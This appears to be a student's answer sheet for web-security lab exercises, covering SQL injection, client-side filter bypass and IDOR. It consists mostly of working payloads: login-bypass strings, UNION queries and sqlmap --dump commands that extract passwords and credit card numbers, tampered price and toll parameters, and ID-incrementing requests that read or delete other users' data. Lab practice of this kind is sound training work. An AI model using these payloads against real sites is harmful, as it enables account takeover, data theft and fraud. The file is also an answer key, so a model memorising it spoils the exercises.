----------------------------------
# SQL Injection

## Authentication Bypass Variant 1
### query:
SELECT * FROM users WHERE username='admin' AND password='pass'

### task:
You know how SQL is used to create login pages. Use that knowledge and try to figure out a way to login without any credentials. 

### payload:
*username*:admin

*password*:pass' OR 1=1 --+

**NOTE:** + is similar to space in URL encoding




## Authentication Bypass Variant 2
### query:
SELECT * FROM users WHERE username='admin' AND password='1a1dc91c907325c69271ddf0c944bc72'

### task:
You already know how to do a basic authentication bypass. Now try to do this one with a slight twist.

### payload:
*username*:admin' OR 1=1 -- 

*password*:123



## GET Based SQL Injection in URL Variant 1
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff' UNION SELECT username,password FROM users --+



## GET Based SQL Injection in URL Variant 2
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
*direct method by guessing*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,NULL,NULL,password FROM users --+



*another appraoch*

*getting database name first*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT database(),version(),NULL,NULL --+ 

database-->SQL_Injection_V4
version-->5.7.29-0ubuntu0.18.04.1

*getting table names from database*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_type = 'base table' --+

OR

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --tables

tables-->
bank_details	

movies 			

users

*getting column names from 'users' table*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users' --+

OR

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --columns -T users



columns names-->
id 			
username 			
password

*getting username and password from 'users' table*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,password,NULL,NULL FROM users --+

OR

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --dump -T users

username 	password

qwerty123 	keypad 

123456789 	login 	

batman 	joker 		

superman 	kryptonite


## GET Based SQL Injection in URL Variant 3
### query:
http://13.127.82.143/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=4

### task:
Your task is to fetch all the credit card numbers from the database of the website below.

### payload:

*apply similiar steps as Variant 2 to get database name,table name,column name and finally to get credit card numbers*

http://13.127.82.143/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=4) UNION SELECT NULL,id,card_number,NULL FROM users_credit_cards --+

1, 8146 5302 1546 7621

2, 4694 6630 2754 6708

3, 6194 6630 2454 6301

4, 5694 7680 6474 2353

5, 5137 6681 6694 1681


## Post Based SQL Injection Variant 2
### query:
SELECT * FROM hotels WHERE city='Delhi''

### task:
You have valid credentials for this login page (Username: test2@test.com; Password: pass). Your task is to intercept the POST requests and try performing SQL injection manually and by using sqlmap.

### payload:
' OR 1=1--+

SELECT * FROM hotels WHERE city=Delhi' ORDER BY 1,2,3,4,5,6,7,8,9--+'

SELECT * FROM hotels WHERE city=Delhi' UNION SELECT 1,2,3,4,5,6,7--+'

SELECT * FROM hotels WHERE city=Delhi' UNION SELECT 1,database(),3,4,version(),6,7--+'

database-->SQL_Injection_V7
version-->5.7.29-0ubuntu0.18.04.1

SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,version(),6,7 FROM information_schema.tables WHERE table_type='BASE TABLE'--+'

tables-->hotels,users

SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,version(),6,7 FROM information_schema.columns WHERE table_name='users'--+'

columns-->id,username,password

SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(id),3,4,GROUP_CONCAT(username),GROUP_CONCAT(password),7 FROM users--+'

id-->1,2

username-->test@test.com,test2@test.com 

password-->pass,1a1dc91c907325c69271ddf0c944bc72

*second approach*

intercept POST request in burp suite copy the request in notepad and name it post_sql.txt save it in same directory as sqlmap

(searching for database name)

python sqlmap.py -r post_sql.txt --dbs

(searching for table names)

python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 --tables

(searching for columns names)

python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users --columns

(getting data from columns)

python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users -C id,username,password --dump

## Post Based SQL Injection Variant 3
### query:
sign=Capricorn

### task:
You have valid credentials for this login page (Username: test2@test.com; Password: pass). Your task is to intercept the POST requests and try performing SQL injection manually and by using sqlmap.

copy paste the intercepted request into file called post_sql.txt 


python sqlmap.py -r post_sql.txt --dbs

python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 --tables

python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users --columns

 python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users -C id,username,password --dump

 

----------------------------------
# Bypassing Client Side Filters

## Client Side Validation Bypass Variant 1
### query:
email=john456%40gmail.com&password=123&fname=john&lname=john&terms=true

### task:
See how many client side filters you can bypass in the form below. 

### payload:
email=john456&password=123&fname=john&lname=john


## Client Side Validation Bypass Variant 2
### query:
price=3000&discount=300&balance=1000

### task:
Your task is to buy the headphones with the balance you have in your wallet.

### payload:

*discount parameter: is vulnerable as it is not validated on server side other two paratmeters are validated at server side*

price=3000&discount=2500&balance=1000


## Client Side Validation Bypass Variant 3
### query:
bprice=1000&toll=200&balance=500

### task:
See if you can schedule the ride without adding money to your wallet by bypassing any of the client side filters.

### payload:
*toll parameter: is vulnerable as it is not validated on server side other two paratmeters are validated at server side*

bprice=1000&toll=-500&balance=500


--------------------------------------------
# IDOR and Rate-limiting issues


## GET Based IDOR in URL Variant 1

### query:
http://13.233.245.52/Insecure-Direct-Object-Reference/GET-Based-IDOR-in-URL-Variant-1/bill.php?user_id=1438

### task:
Check if there's an IDOR vulnerability in the website below. If there is, find out how much user data can a hacker steal with it.

### payload:
*user_id parameter is vulnerable*
bill.php?user_id=1439


## Post Based IDOR Variant 1

### query:
phone_num=%2B91-9876543210

### task:
You were hired as a security expert by an organisation and you found the phone number of an important employee through social hacking. You also found out he was registered on this same website as you. Now use his number (+91-6842097531) and see if you can get his call details.

### payload:
phone_num=%2B91-6842097531

## GET Based IDOR in URL Variant 2

###query:
http://13.233.245.52/Insecure-Direct-Object-Reference/GET-Based-IDOR-in-URL-Variant-2/delete-post.php?post_id=931642

### task:
See if you can delete the posts of other users, apart from yours.

### payload:
*post_id is vulnerable paramter here*
*each users id is attached to thier name*

/delete-post.php?post_id=931642

>eg: Bulla928451
>name: Bulla
>id: 928451

*to delete this users comment*

/delete-post.php?post_id=928451

## Post Based IDOR in URL Variant 2

### query:
emp=EMP9D

### task:
See if you can tamper with the Employee ID and extract salary details of other employees working at ABC Pvt. Ltd.

### payload:
*burte force '9D' parameter with burp suite intruder*

>eg:
>emp=EMP6Y
>emp=EMP3C


## Download based IDOR

### query:
/Download-based/statement.php?accno=4001012392389

### task:
See if you can download the account statement for any other account numbers, other than yours.

### payload:
*acc no parameter is vulnerable increase the acc no by 1*

>ie:
accno=4001012392390






